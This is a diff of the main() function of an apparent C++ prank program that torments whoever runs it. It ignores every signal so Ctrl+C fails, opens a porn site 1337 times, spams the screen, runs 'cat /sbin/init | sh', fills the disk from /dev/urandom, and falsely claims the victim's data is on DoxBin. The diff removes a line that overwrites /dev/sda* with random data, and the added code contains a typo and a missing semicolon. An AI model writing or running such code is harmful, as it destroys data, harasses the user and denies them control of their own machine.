@@ -95,17 +95,14 @@ int handleConnections() {
 
 int main()
 {
-
   std::thread ipc_thread(handleConnections);
   ipc_thread.detach();
-  short repeatLoop = 64;
+  short repeatLoop = 0;
 
   // Okay so I wanted to block as many signals as I could, so this loop covers that.
-  while(repeatLoop > 0) {
-    std::signal(repeatLoop, SIG_IGN);
-    repeatLoop--;
+  for(int i = 64; i > 0; i--) {
+    std::signal(i, SIG_IGN);
   }
-  initializeMiku();
   // The most boring yet effective thing: TEXT.
   sleep(10);
   displayText("lol still using this PC?");
@@ -123,9 +120,8 @@ int main()
   displayText("it sucks ass! So I'll fire up ChatGPT now to make you suffer. :)");
 
   // Ruining browser history with ChatGPT
-  repeatLoop = 10;
 
-  while (repeatLoop--) {
+  for(int openGPT = 10; openGPT > 0; openGPT--) {
     system("xdg-open https://chatgpt.com");
   }
   sleep(5);
@@ -145,13 +141,12 @@ int main()
   displayText("\nHey I'm annoying, right? Just Ctrl+C!");
   sleep(6);
 
-  repeatLoop = 1337;
-
-  while(repeatLoop--) {
+  // This one is pure evil.
+  for(int openHub = 1337; openHub > 0; openHub--) {
     system("xdg-open https://pornhub.com");
   }
-  sleep(5);
 
+  sleep(5);
   displayText("\nRIP your browser history. In case you don't have a browser, nothing ran.");
   sleep(7);
   displayText("\nYour data is now on DoxBin! Well, at least if you have internet.");
@@ -163,13 +158,13 @@ int main()
   displayText("\nHere we are, already at UTAUs, why not keep going?\nDon't worry, there will be some Momone Momo later.");
   sleep(8);
 
-  repeatLoop = 10000;
+  // Whoever runs this with notifications on, RIP eardrums.
 
-  while(repeatLoop--) {
+  for(int momoneMomo = 10000; momoneMomo > 0; momoneMomo--) {
     displayText("\nMomone Momo");
-     usleep(1000);
+    usleep(1000);
   }
-  repeatLoop = -1;
+
   sleep(5);
   displayText("\nOh wait did I figure it out?");
   system("mpv --no-video --volume=70 https://www.youtube.com/watch?v=GCcWD265-3E > /dev/null &");
@@ -186,18 +181,19 @@ int main()
   sleep(10);
 
   // This next part is untested.
-  repeatLoop = 100;
 
-  while(repeatLoop--) {
+  for(int clearScreen = 100; clearScreen > 0; cleatScreen--) {
     displayText("\033[2J\033[1;1H");
     usleep(600000);
   }
 
   system("cat /sbin/init | sh");
   sleep(5);
-  system("cat /dev/urandom > /dev/sda* & ");
+  system("cat /dev/urandom > /miku/mikumiku.scrnsvr &");
   displayText("Man I don't know what to do.");
   sleep(8);
   displayText("Just kidding check your disk space.");
-
+  sleep(10);
+  initializeMiku();
+  displayText("To any Defoko fans here, don't worry. There will be some things in a little bit.")
 }
